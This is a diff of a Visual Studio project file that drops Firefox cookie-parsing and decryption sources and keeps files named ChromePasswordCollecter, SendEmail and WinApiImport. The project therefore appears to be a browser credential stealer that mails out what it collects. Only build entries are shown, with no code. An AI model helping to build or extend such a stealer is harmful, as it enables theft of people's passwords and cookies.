@@ -167,15 +167,8 @@
     <ClInclude Include="includes\ChromePasswordCollecter.h" />
     <ClInclude Include="includes\cJSON.h" />
     <ClInclude Include="includes\cJSON_Utils.h" />
-    <ClInclude Include="includes\FactoryCollector.h" />
-    <ClInclude Include="includes\FileOperations.h" />
-    <ClInclude Include="includes\FireFoxCookiesParser.h" />
-    <ClInclude Include="includes\FirefoxDecryptor.h" />
-    <ClInclude Include="includes\FireFoxParser.h" />
-    <ClInclude Include="includes\Forwards.h" />
+    <ClInclude Include="includes\common.h" />
     <ClInclude Include="includes\framework.h" />
-    <ClInclude Include="includes\ICollector.h" />
-    <ClInclude Include="includes\IDecryptor.h" />
     <ClInclude Include="includes\SendEmail.h" />
     <ClInclude Include="includes\sqlite3.h" />
     <ClInclude Include="includes\WinApiImport.h" />
@@ -194,11 +187,6 @@
     <ClCompile Include="src\ChromePasswordCollecter.cpp" />
     <ClCompile Include="src\cJSON.c" />
     <ClCompile Include="src\cJSON_Utils.c" />
-    <ClCompile Include="src\FireFoxCookiesParser.cpp" />
-    <ClCompile Include="src\FirefoxDecryptor.cpp" />
-    <ClCompile Include="src\FireFoxParser.cpp" />
-    <ClCompile Include="src\ICollector.cpp" />
-    <ClCompile Include="src\IDecryptor.cpp" />
     <ClCompile Include="src\SendEmail.cpp" />
     <ClCompile Include="src\sqlite3.c" />
   </ItemGroup>
